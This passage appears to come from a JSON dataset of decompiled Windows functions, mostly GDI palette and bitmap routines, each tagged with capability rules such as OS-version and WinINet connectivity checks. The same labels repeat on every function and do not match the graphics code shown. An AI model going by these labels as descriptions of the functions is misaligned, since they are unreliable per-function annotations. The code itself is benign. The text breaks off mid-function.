        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint fcn.0042c970(void)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    uint uVar2;\n    uint uStack1064;\n    int32_t iStack1060;\n    uchar *puStack1056;\n    int32_t iStack1052;\n    uint uStack1048;\n    uchar *puStack1044;\n    uint uStack1040;\n    \n    puStack1044 = &stack0xfffffbf0;\n    uVar2 = 0;\n    if (in_EAX != 0) {\n        uStack1040 = 0;\n        uStack1048 = 4;\n        puStack1056 = 0x42c98e;\n        iStack1052 = in_EAX;\n        iVar1 = sub.gdi32.dll_GetObjectA();\n        if ((iVar1 != 0) && (iStack1052 != 0)) {\n            uStack1048 = CONCAT22(iStack1052, 0x300);\n            puStack1056 = &stack0xfffffbec;\n            iStack1060 = iStack1052;\n            uStack1064 = 0;\n            sub.gdi32.dll_GetPaletteEntries();\n            uVar2 = sub.gdi32.dll_CreatePalette(&stack0xfffffbd8);\n        }\n    }\n    return uVar2;\n}\n",
        "token_count": 299
    },
    "0042c9d4": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __fastcall fcn.0042c9d4(int32_t param_1, int32_t param_2)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    uint uVar2;\n    int32_t *in_FS_OFFSET;\n    int32_t in_stack_fffffec8;\n    int32_t in_stack_ffffff24;\n    int32_t iStack204;\n    uint uStack200;\n    uchar *puStack196;\n    int32_t iStack192;\n    int32_t iStack188;\n    int32_t iStack184;\n    uint uStack180;\n    uint uStack176;\n    uint uStack172;\n    uint uStack168;\n    uint uStack164;\n    int32_t iStack160;\n    uint uStack156;\n    int32_t iStack152;\n    uint uStack148;\n    uchar *puStack144;\n    uint uStack136;\n    uint *puStack132;\n    uint lpvObject;\n    uint nWidth;\n    uint nHeight;\n    int32_t var_5ch;\n    uint var_58h;\n    int32_t var_1ch;\n    int32_t var_18h;\n    char var_11h;\n    int32_t hdcDest;\n    int32_t hdc;\n    int32_t var_8h;\n    int32_t hgdiobj;\n    \n    hgdiobj = 0;\n    if (in_EAX != 0) {\n        puStack132 = &fcn.0042c9d4::lpvObject;\n        uStack136 = 0x54;\n        puStack144 = 0x42c9fc;\n        iVar1 = sub.gdi32.dll_GetObjectA();\n        if (iVar1 != 0) {\n            puStack144 = 0x42ca0b;\n            fcn.0042bec8();\n            var_8h = 0;\n            hdcDest = 0;\n            uStack148 = 0x42cbcf;\n            iStack152 = *in_FS_OFFSET;\n            *in_FS_OFFSET = &stack0xffffff68;\n            uStack156 = 0;\n            iStack160 = 0x42ca2a;\n            puStack144 = &stack0xfffffffc;\n            sub.user32.dll_GetDC();\n            iStack160 = 0x42ca2f;\n            iStack160 = fcn.00428f64();\n            uStack164 = 0x42ca3b;\n            var_8h = iStack160;\n            sub.gdi32.dll_CreateCompatibleDC();\n            uStack164 = 0x42ca40;\n            hdcDest = fcn.00428f64();\n            uStack164 = 0;\n            uStack168 = 1;\n            uStack172 = 1;\n            uStack176 = nHeight;\n            uStack180 = nWidth;\n            iStack184 = 0x42ca56;\n            hgdiobj = sub.gdi32.dll_CreateBitmap();\n            if (hgdiobj != 0) {\n                iStack188 = hdcDest;\n                iStack192 = 0x42ca70;\n                iStack184 = hgdiobj;\n                var_1ch = sub.gdi32.dll_SelectObject();\n                if (param_1 != 0x1fffffff) {\n                    iStack192 = var_8h;\n                    puStack196 = 0x42caa0;\n                    sub.gdi32.dll_CreateCompatibleDC();\n                    puStack196 = 0x42caa5;\n                    hdc = fcn.00428f64();\n                    uStack200 = 0x42cb87;\n                    iStack204 = *in_FS_OFFSET;\n                    *in_FS_OFFSET = &stack0xffffff34;\n                    if (var_5ch == 0) {\n                        var_11h = '\\0';\n                        puStack196 = &stack0xfffffffc;\n                    }\n                    else {\n                        var_11h = '\\x01';\n                        var_58h = 0;\n                        puStack196 = &stack0xfffffffc;\n                        in_EAX = fcn.0042c30c(0, &fcn.0042c9d4::lpvObject);\n                    }\n                    var_18h = sub.gdi32.dll_SelectObject(hdc, in_EAX);\n                    if (param_2 != 0) {\n                        sub.gdi32.dll_SelectPalette(hdc, param_2, 0);\n                        sub.gdi32.dll_RealizePalette(hdc);\n                        sub.gdi32.dll_SelectPalette(hdcDest, param_2, 0);\n                        sub.gdi32.dll_RealizePalette(hdcDest);\n                    }\n                    uVar2 = sub.gdi32.dll_SetBkColor(hdc, param_1);\n                    sub.gdi32.dll_BitBlt(hdcDest, 0, 0, nWidth, nHeight, hdc, 0, 0, 0xcc0020);\n                    sub.gdi32.dll_SetBkColor(hdc, uVar2);\n                    if (var_18h != 0) {\n                        in_stack_fffffec8 = hdc;\n                        sub.gdi32.dll_SelectObject(hdc, var_18h);\n                    }\n                    if (var_11h != '\\0') {\n                        sub.gdi32.dll_DeleteObject(in_EAX);\n                    }\n                    *in_FS_OFFSET = in_stack_fffffec8;\n                    uVar2 = sub.gdi32.dll_DeleteDC(hdc, 0x42cb8e);\n                    return uVar2;\n                }\n                iStack192 = 0x42;\n                puStack196 = nHeight;\n                uStack200 = nWidth;\n                iStack204 = 0;\n                sub.gdi32.dll_PatBlt(hdcDest, 0);\n                if (var_1ch != 0) {\n                    in_stack_ffffff24 = hdcDest;\n                    sub.gdi32.dll_SelectObject(hdcDest, var_1ch);\n                }\n            }\n            uVar2 = 0;\n            *in_FS_OFFSET = in_stack_ffffff24;\n            if (hdcDest != 0) {\n                uVar2 = sub.gdi32.dll_DeleteDC(hdcDest, 0x42cbd6);\n            }\n            if (var_8h != 0) {\n                uVar2 = sub.user32.dll_ReleaseDC(0, var_8h);\n            }\n            return uVar2;\n        }\n    }\n    return hgdiobj;\n}\n",
        "token_count": 1360
    },
    "0042cbe0": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t * __fastcall fcn.0042cbe0(uint param_1, char param_2)\n\n{\n    int32_t *in_EAX;\n    int32_t iVar1;\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    uint uStack28;\n    \n    if (param_2 != '\\0') {\n        in_EAX = fcn.00404964();\n        param_2 = extraout_DL;\n    }\n    fcn.0042a100();\n    in_EAX[0xd] = 0x20000000;\n    iVar1 = fcn.00404610();\n    in_EAX[10] = iVar1;\n    fcn.0042c138();\n    if (*0x4a1d14 != '\\0') {\n        (**(*in_EAX + 0x70))();\n    }\n    if (param_2 != '\\0') {\n        fcn.004049bc();\n        *in_FS_OFFSET = uStack28;\n    }\n    return in_EAX;\n}\n",
        "token_count": 220
    },
    "0042cee4": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0042cee4(int32_t *param_1, int32_t param_2)\n\n{\n    bool bVar1;\n    char cVar2;\n    int32_t *in_EAX;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t arg_2ch;\n    int32_t arg_28h;\n    int32_t iVar5;\n    int32_t iVar6;\n    uint *in_FS_OFFSET;\n    uint uVar7;\n    uint uStack108;\n    uint uStack104;\n    uchar *puStack100;\n    uint *puStack96;\n    uint uStack92;\n    uchar *puStack88;\n    uint uStack84;\n    uint *puStack80;\n    uint uStack76;\n    uint uStack72;\n    uint uStack68;\n    uint uStack64;\n    uint uStack60;\n    uint uStack56;\n    int32_t iStack52;\n    uint uStack48;\n    uint var_1ch;\n    uint var_18h;\n    uint var_11h;\n    uint var_dh;\n    char var_9h;\n    uint var_8h;\n    int32_t var_4h;\n    \n    iVar6 = in_EAX[10];\n    uStack48 = 0x42cf06;\n    var_4h = param_2;\n    fcn.00428c3c();\n    uStack48 = 0x42cf0d;\n    fcn.0042d560();\n    var_8h = 0;\n    var_9h = 0;\n    iVar3 = *(iVar6 + 0x10);\n    if (iVar3 != 0) {\n        uStack48 = 0xffffffff;\n        uStack56 = *(var_4h + 4);\n        uStack60 = 0x42cf2c;\n        iStack52 = iVar3;\n        var_8h = sub.gdi32.dll_SelectPalette();\n        uStack60 = *(var_4h + 4);\n        uStack64 = 0x42cf3b;\n        sub.gdi32.dll_RealizePalette();\n    }\n    uStack64 = 0xc;\n    uStack68 = *(var_4h + 4);\n    uStack72 = 0x42cf4d;\n    var_9h = iVar3 != 0;\n    uStack72 = sub.gdi32.dll_GetDeviceCaps();\n    uStack76 = 0xe;\n    puStack80 = *(var_4h + 4);\n    uStack84 = 0x42cf5c;\n    iVar3 = sub.gdi32.dll_GetDeviceCaps();\n    if ((puStack80 * iVar3 < 9) && (puStack80 * iVar3 < *(iVar6 + 0x2a) * *(iVar6 + 0x28))) {\n        bVar1 = true;\n    }\n    else {\n        bVar1 = false;\n    }\n    if (bVar1) {\n        puStack80 = &fcn.0042cee4::var_11h;\n        uStack84 = *(var_4h + 4);\n        puStack88 = 0x42cf8f;\n        sub.gdi32.dll_GetBrushOrgEx();\n        puStack88 = 0x4;\n        uStack92 = *(var_4h + 4);\n        puStack96 = 0x42cf9d;\n        sub.gdi32.dll_SetStretchBltMode();\n        puStack96 = &fcn.0042cee4::var_11h;\n        puStack100 = var_dh;\n        uStack104 = var_11h;\n        uStack108 = *(var_4h + 4);\n        sub.gdi32.dll_SetBrushOrgEx();\n    }\n    else {\n        puStack80 = 0x42cfbe;\n        cVar2 = fcn.0042d270();\n        if (cVar2 == '\\0') {\n            puStack80 = 0x3;\n            uStack84 = 0x42cfcc;\n            uStack84 = fcn.00428b60();\n            puStack88 = 0x42cfd2;\n            sub.gdi32.dll_SetStretchBltMode();\n        }\n    }\n    uStack92 = 0x42d122;\n    puStack96 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffa0;\n    puStack100 = 0x42cfe7;\n    puStack88 = &stack0xfffffffc;\n    cVar2 = (**(*in_EAX + 0x28))();\n    if (cVar2 != '\\0') {\n        puStack100 = 0x42cff2;\n        fcn.0042d500();\n    }\n    puStack100 = 0x42cff9;\n    fcn.0042d1b4();\n    puStack100 = 0x42d005;\n    fcn.00428c3c();\n    puStack100 = 0x42d00c;\n    cVar2 = (**(*in_EAX + 0x28))();\n    if (cVar2 != '\\0') {\n        uStack104 = 0x42d0b7;\n        uStack108 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffff94;\n        puStack100 = &stack0xfffffffc;\n        sub.gdi32.dll_CreateCompatibleDC(0);\n        iVar3 = fcn.00428f64();\n        iVar4 = sub.gdi32.dll_SelectObject(iVar3, *(iVar6 + 0xc));\n        arg_2ch = param_1[2] - *param_1;\n        arg_28h = param_1[3] - param_1[1];\n        iVar5 = fcn.0042d1b4();\n        uVar7 = 0;\n        fcn.00429114(0, 0, iVar3, *(iVar6 + 0x20), *(iVar6 + 0x1c), 0, 0, *(iVar5 + 4), arg_28h, arg_2ch);\n        *in_FS_OFFSET = uVar7;\n        if (iVar4 != 0) {\n            sub.gdi32.dll_SelectObject(iVar3, iVar4, 0x42d0fc);\n        }\n        if (iVar3 != 0) {\n            sub.gdi32.dll_DeleteDC(iVar3);\n        }\n        return;\n    }\n    puStack100 = *(var_4h + 0x20);\n    uStack104 = *(iVar6 + 0x20);\n    uStack108 = *(iVar6 + 0x1c);\n    iVar6 = fcn.0042d1b4(0, 0);\n    uVar7 = *(var_4h + 4);\n    sub.gdi32.dll_StretchBlt(uVar7, *param_1, param_1[1], param_1[2] - *param_1, param_1[3] - param_1[1], *(iVar6 + 4));\n    *in_FS_OFFSET = uVar7;\n    if (var_9h != '\\0') {\n        sub.gdi32.dll_SelectPalette(*(var_4h + 4), var_8h, 0xffffffff, 0x42d129);\n    }\n    return;\n}\n",
        "token_count": 1594
    },
    "0042d134": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0042d134(void)\n\n{\n    int32_t iVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    \n    iVar1 = *(in_EAX + 0x28);\n    if (1 < *(iVar1 + 4)) {\n        fcn.0042d460();\n        fcn.0042cd80(iVar1 + 0x18);\n        return;\n    }\n    if ((*(iVar1 + 8) != 0) && (*(iVar1 + 8) != *(iVar1 + 0x14))) {\n        if ((*(iVar1 + 0x14) != 0) && (iVar2 = sub.gdi32.dll_DeleteObject(*(iVar1 + 0x14)),  iVar2 == 0)) {\n            fcn.00428ebc();\n        }\n        *(iVar1 + 0x14) = 0;\n        *(iVar1 + 0x2c) = 0;\n    }\n    return;\n}\n",
        "token_count": 217
    },
    "0042d1b4": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t fcn.0042d1b4(void)\n\n{\n    int32_t *in_EAX;\n    int32_t iVar1;\n    \n    if (in_EAX[0xb] == 0) {\n        fcn.0042d460();\n        if (in_EAX[0xb] == 0) {\n            iVar1 = fcn.0042bf44();\n            in_EAX[0xb] = iVar1;\n            *(iVar1 + 0x2c) = in_EAX;\n            *(iVar1 + 0x28) = *(*in_EAX + 0x10);\n            *(iVar1 + 0x34) = in_EAX;\n            *(iVar1 + 0x30) = fcn.0042ce40;\n        }\n    }\n    return in_EAX[0xb];\n}\n",
        "token_count": 181
    },
    "0042d220": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint fcn.0042d220(void)\n\n{\n    int32_t iVar1;\n    int32_t in_EAX;\n    unkbyte3 Var3;\n    uint uVar2;\n    \n    iVar1 = *(in_EAX + 0x28);\n    Var3 = iVar1 >> 8;\n    if ((*(iVar1 + 8) == 0) || (*(iVar1 + 8) == *(iVar1 + 0x14))) {\n        if (*(iVar1 + 0x14) != 0) {\n            return 0;\n        }\n        if (*(iVar1 + 0x30) == 0) {\n            uVar2 = CONCAT31(Var3, 1);\n        }\n        else {\n            uVar2 = 0;\n        }\n    }\n    else {\n        uVar2 = CONCAT31(Var3, 1);\n    }\n    return uVar2;\n}\n",
        "token_count": 194
    },
    "0042d3dc": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0042d3dc(void)\n\n{\n    int32_t iVar1;\n    int32_t in_EAX;\n    uint uVar2;\n    \n    iVar1 = *(in_EAX + 0x28);\n    if ((*(iVar1 + 8) != 0) && (*(iVar1 + 0x14) == 0)) {\n        fcn.0042d560();\n        if (*(iVar1 + 0x30) == 0) {\n            sub.gdi32.dll_GetObjectA(*(iVar1 + 8), 0x54, iVar1 + 0x18);\n            *(iVar1 + 0x30) = 0x28;\n            *(iVar1 + 0x34) = *(iVar1 + 0x1c);\n            *(iVar1 + 0x38) = *(iVar1 + 0x20);\n            *(iVar1 + 0x3c) = 1;\n            *(iVar1 + 0x3e) = *(iVar1 + 0x28) * *(iVar1 + 0x2a);\n        }\n        uVar2 = fcn.0042c30c(0, iVar1 + 0x18);\n        *(iVar1 + 0x14) = uVar2;\n    }\n    return;\n}\n",
        "token_count": 283
    },
    "0042d460": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0042d460(void)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t *in_EAX;\n    uint *in_FS_OFFSET;\n    uint uStackY40;\n    uint uStackY36;\n    uchar *puStackY32;\n    uint var_10h;\n    uint var_ch;\n    uint var_4h;\n    \n    iVar1 = in_EAX[10];\n    if (((*(iVar1 + 8) == 0) && (*(iVar1 + 0x14) == 0)) && (*(iVar1 + 0x6c) != 0)) {\n        puStackY32 = 0x42d48d;\n        fcn.0041b4ac(0, 0);\n        iVar1 = in_EAX[4];\n        iVar2 = in_EAX[5];\n        uStackY36 = 0x42d4e3;\n        uStackY40 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffffd8;\n        in_EAX[4] = 0;\n        in_EAX[5] = 0;\n        puStackY32 = &stack0xfffffffc;\n        (**(*in_EAX + 0x54))();\n        *in_FS_OFFSET = uStackY40;\n        in_EAX[4] = iVar1;\n        in_EAX[5] = iVar2;\n        return;\n    }\n    iVar1 = in_EAX[10];\n    if (*(iVar1 + 8) == 0) {\n        *(iVar1 + 8) = *(iVar1 + 0x14);\n    }\n    return;\n}\n",
        "token_count": 359
    },
    "0042d500": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0042d500(void)\n\n{\n    int32_t iVar1;\n    int32_t in_EAX;\n    uint uVar2;\n    \n    if ((*(in_EAX + 0x32) == '\\0') || (*(in_EAX + 0x31) == '\\0')) {\n        iVar1 = *(in_EAX + 0x28);\n        if (*(iVar1 + 0xc) != 0) {\n            fcn.0042bec8();\n            sub.gdi32.dll_DeleteObject(*(iVar1 + 0xc));\n            *(iVar1 + 0xc) = 0;\n        }\n        fcn.0042d450();\n        fcn.0042d460();\n        iVar1 = *(in_EAX + 0x28);\n        fcn.0042d38c();\n        uVar2 = fcn.0042c9d4();\n        *(iVar1 + 0xc) = uVar2;\n        *(in_EAX + 0x32) = 1;\n        *(in_EAX + 0x31) = 1;\n    }\n    return;\n}\n",
        "token_count": 243
    },
    "0042d560": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0042d560(void)\n\n{\n    int32_t iVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    uint uVar3;\n    int32_t iVar4;\n    uint uVar5;\n    char cVar6;\n    \n    iVar1 = *(in_EAX + 0x28);\n    if (*(in_EAX + 0x30) != '\\0') {\n        return;\n    }\n    if (*(iVar1 + 0x10) != 0) {\n        return;\n    }\n    if (*(iVar1 + 0x14) == 0) {\n        return;\n    }\n    if (*(iVar1 + 0x14) == *(iVar1 + 8)) {\n        fcn.0042bec8();\n    }\n    iVar2 = fcn.0042965c();\n    *(iVar1 + 0x10) = iVar2;\n    if (iVar2 != 0) {\n        return;\n    }\n    sub.user32.dll_GetDC(0);\n    uVar3 = fcn.00428f64();\n    if (*(iVar1 + 0x71) == '\\0') {\n        iVar2 = sub.gdi32.dll_GetDeviceCaps(uVar3, 0xc);\n        iVar4 = sub.gdi32.dll_GetDeviceCaps(uVar3, 0xe);\n        if (*(iVar1 + 0x2a) * *(iVar1 + 0x28) <= iVar2 * iVar4) {\n            cVar6 = '\\0';\n            goto code_r0x0042d5f1;\n        }\n    }\n    cVar6 = '\\x01';\ncode_r0x0042d5f1:\n    *(iVar1 + 0x71) = cVar6;\n    if (cVar6 != '\\0') {\n        uVar5 = sub.gdi32.dll_CreateHalftonePalette(uVar3);\n        *(iVar1 + 0x10) = uVar5;\n    }\n    sub.user32.dll_ReleaseDC(0, uVar3);\n    if (*(iVar1 + 0x10) == 0) {\n        *(in_EAX + 0x30) = 1;\n    }\n    return;\n}\n",
        "token_count": 477
    },
    "0042d618": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0042d618(uint arg_8h)\n\n{\n    int32_t *in_EAX;\n    int32_t iVar1;\n    int32_t in_ECX;\n    int16_t in_DX;\n    uint var_54h;\n    int32_t var_40h;\n    uint var_3ch;\n    \n    if ((in_DX != 2) || (in_ECX == 0)) {\n        fcn.00428e2c();\n    }\n    fcn.0042d450();\n    fcn.00403ae4();\n    sub.gdi32.dll_GetObjectA();\n    if (var_40h == 0) {\n        var_3ch = 0;\n    }\n    fcn.0042cd80(&var_54h);\n    *(in_EAX[10] + 0x70) = 0;\n    iVar1 = (**(*in_EAX + 0x24))();\n    *(in_EAX + 0x22) = iVar1 != 0;\n    (**(*in_EAX + 0x10))();\n    return;\n}\n",
        "token_count": 238
    },
    "0042d6c0": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0042d6c0(uint arg_8h, uint arg_ch, uint *arg_10h)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    uint uVar2;\n    uint in_ECX;\n    int32_t iVar3;\n    uint in_EDX;\n    uint *puVar4;\n    uint *in_FS_OFFSET;\n    uint uStack40;\n    uint uStack36;\n    uchar *puStack32;\n    uchar *puStack28;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack28 = 0x42d6dc;\n    iVar1 = fcn.00404610();\n    puStack32 = 0x42d748;\n    uStack36 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffdc;\n    *(iVar1 + 8) = in_EDX;\n    *(iVar1 + 0x10) = in_ECX;\n    puVar4 = iVar1 + 0x18;\n    for (iVar3 = 0x15; iVar3 != 0; iVar3 = iVar3 + -1) {\n        *puVar4 = *arg_10h;\n        arg_10h = arg_10h + 1;\n        puVar4 = puVar4 + 1;\n    }\n    *(iVar1 + 0x70) = arg_ch;\n    if (*(iVar1 + 0x2c) != 0) {\n        *(iVar1 + 0x14) = *(iVar1 + 8);\n    }\n    uStack40 = 0x42d738;\n    puStack28 = &stack0xfffffffc;\n    uVar2 = fcn.004047f0();\n    *(iVar1 + 0x6c) = uVar2;\n    *in_FS_OFFSET = uStack36;\n    puStack28 = 0x4aaa38;\n    puStack32 = 0x42d769;\n    sub.kernel32.dll_EnterCriticalSection();\n    uStack36 = 0x42d7a8;\n    uStack40 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd8;\n    puStack32 = &stack0xfffffffc;\n    fcn.0042c13c();\n    *(in_EAX + 0x28) = iVar1;\n    fcn.0042c138();\n    *in_FS_OFFSET = uStack40;\n    puStack32 = 0x42d7af;\n    uStack36 = 0x4aaa38;\n    uStack40 = 0x42d7a7;\n    sub.kernel32.dll_LeaveCriticalSection();\n    return;\n}\n",
        "token_count": 581
    },
    "0042e134": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __fastcall fcn.0042e134(uint param_1, uint8_t param_2)\n\n{\n    int32_t iVar1;\n    uint8_t uVar2;\n    int32_t *in_EAX;\n    uint uVar3;\n    int32_t iVar4;\n    uint *puVar5;\n    uint *puVar6;\n    int32_t *in_FS_OFFSET;\n    int32_t iStack140;\n    uint uStack136;\n    uchar *puStack132;\n    uint uStack128;\n    uint uStack124;\n    uint uStack120;\n    uint uStack116;\n    uint var_5dh;\n    uint var_59h;\n    uint var_55h;\n    uint var_49h;\n    uint var_45h;\n    uint var_41h;\n    uint var_3dh;\n    uint var_39h;\n    uint var_35h;\n    uint var_1dh;\n    uint var_19h;\n    uint var_15h;\n    int32_t var_9h;\n    int32_t *var_4h;\n    \n    uStack116 = 0x42e14a;\n    var_4h = in_EAX;\n    uVar2 = fcn.0042d2a0();\n    if (param_2 != uVar2) {\n        if (param_2 == 0) {\n            uStack116 = 0x42e168;\n            (**(*var_4h + 0x70))();\n        }\n        else {\n            if (param_2 != 8) {\n                uStack116 = 0x42e18b;\n                fcn.00403ae4();\n                iVar1 = var_4h[10];\n                puVar5 = iVar1 + 0x18;\n                puVar6 = &fcn.0042e134::var_5dh;\n                for (iVar4 = 6; iVar4 != 0; iVar4 = iVar4 + -1) {\n                    *puVar6 = *puVar5;\n                    puVar5 = puVar5 + 1;\n                    puVar6 = puVar6 + 1;\n                }\n                var_9h._0_1_ = '\\0';\n                var_49h = 0;\n                var_45h = 0x28;\n                var_41h = var_59h;\n                var_3dh = var_55h;\n                var_39h._0_2_ = 1;\n                var_39h._2_2_ = *(param_2 + 0x4a1fab);\n                unique0x00007a00 = *(iVar1 + 0x10);\n                if (param_2 == 2) {\n                    stack0xfffffff4 = *0x4aaa1c;\n                }\n                else if (param_2 == 3) {\n                    uStack116 = 0;\n                    uStack120 = 0x42e1f5;\n                    sub.user32.dll_GetDC();\n                    uStack120 = 0x42e1fa;\n                    uVar3 = fcn.00428f64();\n                    uStack124 = 0x42e202;\n                    uStack120 = uVar3;\n                    *NULL = sub.gdi32.dll_CreateHalftonePalette();\n                    var_9h._0_1_ = '\\x01';\n                    uStack128 = 0;\n                    puStack132 = 0x42e211;\n                    uStack124 = uVar3;\n                    sub.user32.dll_ReleaseDC();\n                }\n                else if (param_2 == 5) {\n                    var_35h = 3;\n                    var_1dh = 0xf800;\n                    var_19h = 0x7e0;\n                    var_15h = 0x1f;\n                }\n                uStack136 = 0x42e280;\n                iStack140 = *in_FS_OFFSET;\n                *in_FS_OFFSET = &stack0xffffff74;\n                puVar5 = &fcn.0042e134::var_5dh;\n                puStack132 = &stack0xfffffffc;\n                (**(*var_4h + 0x68))();\n                fcn.0042cd80(puVar5);\n                *(var_4h + 0x22) = stack0xfffffff4 != 0;\n                *in_FS_OFFSET = puVar5;\n                uStack136 = 0x42e287;\n                if (var_9h != '\\0') {\n                    iStack140 = stack0xfffffff4;\n                    sub.gdi32.dll_DeleteObject();\n                }\n                return;\n            }\n            uStack116 = 0x42e177;\n            fcn.00428e2c();\n        }\n    }\n    return;\n}\n",
        "token_count": 1032
    },
    "0042e2c0": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0042e2c0(char param_1, int32_t *param_2)\n\n{\n    uint *puVar1;\n    int32_t iVar2;\n    uchar *puVar3;\n    int32_t in_EAX;\n    uint uVar4;\n    int32_t iStackY1120;\n    uchar *puStackY1116;\n    char cVar5;\n    char cStack1080;\n    uchar auStack1054 [1038];\n    \n    fcn.00403ae4();\n    puVar1 = *(*(in_EAX + 0x28) + 0x6c);\n    if (puVar1 == NULL) {\n        fcn.0042d3dc();\n        iVar2 = *(in_EAX + 0x28);\n        if (*(iVar2 + 0x14) != 0) {\n            cVar5 = *(iVar2 + 0x50);\n            fcn.00429db8(*(iVar2 + 0x50));\n            if (*(iVar2 + 0x70) != '\\0') {\n                cStack1080 = '\\f';\n                if (*(iVar2 + 0x3e) < 9) {\n                    cStack1080 = (1 << (*(iVar2 + 0x3e) & 0x1f)) * '\\x03' + '\\f';\n                }\n            }\n            fcn.00403ae4(cVar5 + cStack1080 + '\\x0e');\n            fcn.0042d1b4();\n            fcn.00428c3c();\n            sub.gdi32.dll_SelectObject(*(*(in_EAX + 0x2c) + 4), *(iVar2 + 0x14));\n            fcn.00428f64();\n            sub.gdi32.dll_GetDIBColorTable(*(*(in_EAX + 0x2c) + 4), 0, 0x100);\n            iStackY1120 = *(*(in_EAX + 0x2c) + 4);\n            sub.gdi32.dll_SelectObject();\n            puVar3 = *(iVar2 + 0x50);\n            puStackY1116 = auStack1054;\n            if ((puVar3 != NULL) && (puVar3 < auStack1054)) {\n                puStackY1116 = puVar3;\n            }\n            if ((((*(iVar2 + 0x70) == '\\0') && (puStackY1116 == NULL)) && (*(iVar2 + 0x10) != 0)) &&\n               ((*(iVar2 + 0x71) == '\\0' && (puStackY1116 = fcn.00429700(),  8 < *(iVar2 + 0x3e))))) {\n                iStackY1120 = iStackY1120 + puStackY1116 * 4;\n            }\n        }\n        if (param_1 != '\\0') {\n            fcn.0041b6f0();\n        }\n        if (iStackY1120 != 0) {\n            fcn.0042c2c0();\n            if (puStackY1116 != NULL) 